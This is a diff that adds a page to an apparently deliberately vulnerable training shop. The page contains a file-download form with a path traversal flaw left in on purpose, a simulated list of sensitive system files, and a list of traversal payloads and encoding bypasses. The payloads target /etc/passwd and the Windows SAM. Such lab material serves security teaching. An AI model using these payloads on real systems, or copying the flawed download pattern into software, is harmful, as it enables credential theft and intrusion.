@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>File Browser — VulnShop</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="assets/css/style.css" />
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand">VulnShop</div>
+    <nav>
+      <a href="index.html">Home</a>
+      <a href="admin/index.html">Admin</a>
+    </nav>
+  </header>
+
+  <main class="container">
+    <h1>File Browser</h1>
+    <p class="muted">Browse and download files from the server.</p>
+
+    <div class="card mt">
+      <h2>Download File</h2>
+      <form id="file-form">
+        <input type="text" name="file" placeholder="products/image.jpg" required style="width: 500px;">
+        <button type="submit">Download</button>
+      </form>
+      <pre id="file-output" class="mt"></pre>
+      <script>
+        document.getElementById('file-form').addEventListener('submit', async (e) => {
+          e.preventDefault();
+          const file = e.target.file.value;
+          const output = document.getElementById('file-output');
+          output.textContent = 'Loading file...';
+          
+          // VULNERABLE: Path Traversal
+          try {
+            const response = await fetch('/api/download?file=' + encodeURIComponent(file));
+            const data = await response.json();
+            output.textContent = data.content || 'File not found';
+          } catch (err) {
+            // Simulate path traversal
+            if (file.includes('..')) {
+              output.textContent = 'Path Traversal Detected!\n\nAccessible files:\n' +
+                '/etc/passwd\n' +
+                '/etc/shadow\n' +
+                '/etc/hosts\n' +
+                '/proc/version\n' +
+                '/proc/self/environ\n' +
+                '/var/log/apache2/access.log\n' +
+                '/home/user/.ssh/id_rsa\n' +
+                '/var/www/html/config.php\n' +
+                'C:\\Windows\\System32\\config\\SAM\n' +
+                'C:\\Windows\\win.ini';
+            } else {
+              output.textContent = 'File content would be displayed here';
+            }
+          }
+        });
+      </script>
+    </div>
+
+    <div class="card mt">
+      <h2>Path Traversal Payloads</h2>
+      <h3>Linux/Unix:</h3>
+      <ul>
+        <li><code>../../../etc/passwd</code></li>
+        <li><code>....//....//....//etc/passwd</code></li>
+        <li><code>..%2F..%2F..%2Fetc%2Fpasswd</code> (URL encoded)</li>
+        <li><code>..%252F..%252F..%252Fetc%252Fpasswd</code> (Double encoded)</li>
+        <li><code>....\/....\/....\/etc/passwd</code></li>
+        <li><code>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></li>
+        <li><code>/etc/passwd%00</code> (Null byte)</li>
+        <li><code>/var/www/html/../../etc/passwd</code></li>
+      </ul>
+
+      <h3>Windows:</h3>
+      <ul>
+        <li><code>..\..\..\..\windows\system32\config\sam</code></li>
+        <li><code>....//....//....//windows//system32//config//sam</code></li>
+        <li><code>..%5c..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam</code></li>
+        <li><code>C:\Windows\System32\config\SAM</code></li>
+        <li><code>..\..\..\..\..\windows\win.ini</code></li>
+      </ul>
+
+      <h3>Bypass Techniques:</h3>
+      <ul>
+        <li>URL encoding: <code>%2e%2e%2f</code></li>
+        <li>Double encoding: <code>%252e%252e%252f</code></li>
+        <li>Unicode encoding: <code>%c0%ae%c0%ae%c0%af</code></li>
+        <li>Null byte: <code>../../../etc/passwd%00.jpg</code></li>
+        <li>Case variation: <code>..%2F..%2F..%2F</code></li>
+        <li>Mixed encoding: <code>..%252f..%252f</code></li>
+      </ul>
+    </div>
+  </main>
+
+  <script src="assets/js/logger.js"></script>
+  <script src="assets/js/app.js"></script>
+</body>
+</html>
